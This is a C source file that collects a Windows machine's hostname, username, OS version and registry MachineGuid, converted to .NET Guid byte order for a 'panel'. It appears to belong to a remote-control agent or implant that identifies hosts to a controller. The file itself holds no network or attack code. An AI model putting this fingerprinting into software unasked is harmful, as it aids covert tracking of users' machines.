/* system_facts.c - collect what this agent reports about its machine.
 * The identity frame's UUID and printable facts come from here.
 */

#include "system_facts.h"
// #include "types.h"
#include "peb.h"
#include "ntdll.h"
#include "kernel32.h"
#include "wintypes.h"
#include "system.h"
#include "advapi.h"
#include "memory.h"
#include <stdio.h>

void collect_system_facts(system_facts *facts)
{
    MemoryZero(facts, sizeof(*facts));

    NTDLL ntdll;
    KERNEL32 kernel;
    ADVAPI advapi;
    if(!KERNEL32_Ctor(&kernel) || !NTDLL_Ctor(&ntdll)){
        return;
    }

    DWORD n = sizeof(facts->hostname);
    if(kernel.GetComputerNameA){
        kernel.GetComputerNameA(facts->hostname, &n);
    } else {
        facts->hostname[0] = '\0';
    }

    
    if (!ADVAPI_Ctor(&advapi)) {
        facts->username[0] = '\0';
    } else {
        n = sizeof(facts->username);
        advapi.GetUserNameA(facts->username, &n);           /* advapi32 */
    }

    /* RtlGetVersion (ntdll) reports the true OS version; the classic
     * GetVersionEx lies to apps without a compatibility manifest. */
    if (ntdll.RtlGetVersion) {
        OSVERSIONINFOW info;
        
        MemoryZero(&info, sizeof(info));
        info.dwOSVersionInfoSize = sizeof(info);
        
        if (ntdll.RtlGetVersion(&info) == 0) {
            snprintf(
                facts->os_version,
                sizeof(facts->os_version),
                "%lu.%lu.%lu",
                info.dwMajorVersion,
                info.dwMinorVersion,
                info.dwBuildNumber
            );
        }
}
}

/* Get the machine UUID from HKLM\...\Cryptography\MachineGuid, converted to
 * the .NET Guid byte order the panel expects. Falls back to all zeros.
 *
 * The registry stores the UUID as text ("00112233-4455-6677-..."); the
 * panel parses the 16 frame bytes as a .NET Guid, whose first three groups
 * (Data1..Data3) are little-endian and whose last group is raw. Hence the
 * reorder at the end: string order -> 33 22 11 00 | 55 44 | 77 66 | raw. */
void get_machine_uuid(unsigned char out[16])
{
    char text[64] = { 0 };
    unsigned char straight[16] = { 0 };
    DWORD size = sizeof(text) - 1;
    const char *p;
    int digits = 0;
    int i;
    ADVAPI advapi;
    HKEY key = NULL;

    if (!ADVAPI_Ctor(&advapi)) {
        return;
    }

    if (advapi.RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Cryptography",
            0,
            KEY_QUERY_VALUE,
            &key) == ERROR_SUCCESS)
    {
        DWORD type = 0;

        if (advapi.RegQueryValueExA(
                key,
                "MachineGuid",
                NULL,
                &type,
                (unsigned char *)text,
                &size) != ERROR_SUCCESS ||
            type != REG_SZ)
        {
            text[0] = '\0';
        }

        advapi.RegCloseKey(key);
    }

    /* Convert hexadecimal characters into 16 bytes. */
    for (p = text; *p != '\0' && digits < 32; p++)
    {
        int v;

        if (*p >= '0' && *p <= '9')
            v = *p - '0';
        else if (*p >= 'a' && *p <= 'f')
            v = *p - 'a' + 10;
        else if (*p >= 'A' && *p <= 'F')
            v = *p - 'A' + 10;
        else
            continue;

        if ((digits & 1) == 0)
            straight[digits / 2] = (unsigned char)(v << 4);
        else
            straight[digits / 2] |= (unsigned char)v;

        digits++;
    }

    if (digits != 32)
    {
        MemoryZero(out, 16);
        return;
    }

    /* Convert string byte order to .NET Guid byte layout. */
    out[0] = straight[3];
    out[1] = straight[2];
    out[2] = straight[1];
    out[3] = straight[0];

    out[4] = straight[5];
    out[5] = straight[4];

    out[6] = straight[7];
    out[7] = straight[6];

    for (i = 0; i < 8; i++)
    {
        out[8 + i] = straight[8 + i];
    }
}
